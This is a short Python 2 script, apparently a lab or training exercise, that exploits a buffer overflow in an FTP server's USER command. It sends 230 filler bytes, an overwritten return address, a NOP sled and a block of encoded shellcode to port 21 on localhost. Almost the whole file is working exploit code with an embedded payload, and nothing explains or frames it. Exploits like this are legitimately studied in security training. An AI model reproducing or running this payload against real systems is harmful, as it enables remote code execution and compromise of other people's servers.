#Kay Murphy
import socket
i = 230
buf =  ""
buf += "\xd9\xc8\xbb\x4b\x1c\xbe\x8d\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x56\x31\x5a\x18\x83\xea\xfc\x03\x5a\x5f\xfe"
buf += "\x4b\x71\xb7\x7c\xb3\x8a\x47\xe1\x3d\x6f\x76\x21\x59"
buf += "\xfb\x28\x91\x29\xa9\xc4\x5a\x7f\x5a\x5f\x2e\xa8\x6d"
buf += "\xe8\x85\x8e\x40\xe9\xb6\xf3\xc3\x69\xc5\x27\x24\x50"
buf += "\x06\x3a\x25\x95\x7b\xb7\x77\x4e\xf7\x6a\x68\xfb\x4d"
buf += "\xb7\x03\xb7\x40\xbf\xf0\x0f\x62\xee\xa6\x04\x3d\x30"
buf += "\x48\xc9\x35\x79\x52\x0e\x73\x33\xe9\xe4\x0f\xc2\x3b"
buf += "\x35\xef\x69\x02\xfa\x02\x73\x42\x3c\xfd\x06\xba\x3f"
buf += "\x80\x10\x79\x42\x5e\x94\x9a\xe4\x15\x0e\x47\x15\xf9"
buf += "\xc9\x0c\x19\xb6\x9e\x4b\x3d\x49\x72\xe0\x39\xc2\x75"
buf += "\x27\xc8\x90\x51\xe3\x91\x43\xfb\xb2\x7f\x25\x04\xa4"
buf += "\x20\x9a\xa0\xae\xcc\xcf\xd8\xec\x98\x3c\xd1\x0e\x58"
buf += "\x2b\x62\x7c\x6a\xf4\xd8\xea\xc6\x7d\xc7\xed\x5f\x69"
buf += "\xf8\x22\xe7\xfa\x06\xc3\x17\xd2\xcc\x97\x47\x4c\xe4"
buf += "\x97\x0c\x8c\x09\x42\xb8\x86\x9d\xad\x94\x7d\xf4\x46"
buf += "\xe6\x81\x16\xcb\x6f\x67\x48\xa3\x3f\x38\x29\x13\xff"
buf += "\xe8\xc1\x79\xf0\xd7\xf2\x81\xdb\x7f\x98\x6d\xb5\x28"
buf += "\x35\x17\x9c\xa3\xa4\xd8\x0b\xce\xe7\x53\xb9\x2e\xa9"
buf += "\x93\xc8\x3c\xde\xc3\x32\xbd\x1f\x66\x32\xd7\x1b\x20"
buf += "\x65\x4f\x26\x15\x41\xd0\xd9\x70\xd2\x17\x25\x05\xe2"
buf += "\x6c\x10\x93\x4a\x1b\x5d\x73\x4a\xdb\x0b\x19\x4a\xb3"
buf += "\xeb\x79\x19\xa6\xf3\x57\x0e\x7b\x66\x58\x66\x2f\x21"
buf += "\x30\x84\x16\x05\x9f\x77\x7d\x15\xd8\x87\x03\x32\x41"
buf += "\xef\xfb\x02\x71\xef\x91\x82\x21\x87\x6e\xac\xce\x67"
buf += "\x8e\x67\x87\xef\x05\xe6\x65\x8e\x1a\x23\x2b\x0e\x1a"
buf += "\xc0\xf0\xa1\x61\xa9\x07\x42\x96\xa3\x63\x43\x96\xcb"
buf += "\x95\x78\x40\xf2\xe3\xbf\x50\x41\xfb\x8a\xf5\xe0\x96"
buf += "\xf4\xaa\xf3\xb2"

try:
    print "Trying %i " % i
    badstr="USER "+"A" * i + "\x44\x99\xFE\x74"+ "\x90" * 20+ buf+"\r\n"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 21))
    print "BANNER: " + sock.recv(2048)
    sock.send(badstr)
    print "RESPONSE: "
    print sock.recv(2048)
except:
    print "Crash at %i" % i
